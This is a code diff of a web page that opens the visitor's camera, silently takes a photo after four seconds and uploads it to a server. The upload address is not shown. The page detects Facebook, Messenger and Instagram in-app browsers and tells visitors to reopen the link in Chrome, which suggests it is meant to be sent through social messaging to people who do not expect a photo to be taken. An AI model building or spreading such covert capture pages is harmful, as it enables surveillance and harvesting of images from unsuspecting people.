@@ -13,27 +13,40 @@
       height: 100vh;
       font-family: sans-serif;
       color: white;
+      text-align: center;
     }
     video {
-      display: block;
       width: 100%;
       max-width: 400px;
       border-radius: 10px;
+    }
+    .warning {
+      color: yellow;
+      font-size: 14px;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
   <h2>Auto-Capturing...</h2>
   <video id="video" autoplay playsinline></video>
+  <p class="warning" id="warn"></p>
 
   <script>
     const video = document.getElementById('video');
+    const warn = document.getElementById('warn');
+
+    // Check if browser is Facebook/Messenger/Instagram
+    const ua = navigator.userAgent || '';
+    if (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram')) {
+      warn.textContent = "⚠️ Camera might not work in Messenger/Facebook browser. Please open this link in Google Chrome.";
+    }
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // Increase timeout to make sure video loads fully
+        // Wait before capturing
         setTimeout(() => {
           const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth || 640;
@@ -44,7 +57,7 @@
           // Stop camera stream
           stream.getTracks().forEach(track => track.stop());
 
-          // Convert to image blob
+          // Convert to blob
           canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('file', blob);
@@ -65,23 +78,16 @@
               `;
             })
             .catch(err => {
-              alert("Upload failed");
+              alert("Upload failed ❌");
               console.error(err);
             });
           }, 'image/jpeg');
-        }, 4000); // wait 4 seconds before capture
+        }, 4000); // wait 4 seconds to allow camera to start
       })
       .catch(err => {
-        alert("Camera access denied or not supported.");
+        alert("❌ Camera access denied or not supported.");
         console.error(err);
       });
-
-
-       // Detect if browser is Facebook/Messenger
-  const ua = navigator.userAgent || '';
-  if (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram')) {
-    alert("⚠️ Camera might not work in Messenger or Facebook browser. Please open in Google Chrome.");
-  }
   </script>
 </body>
 </html>
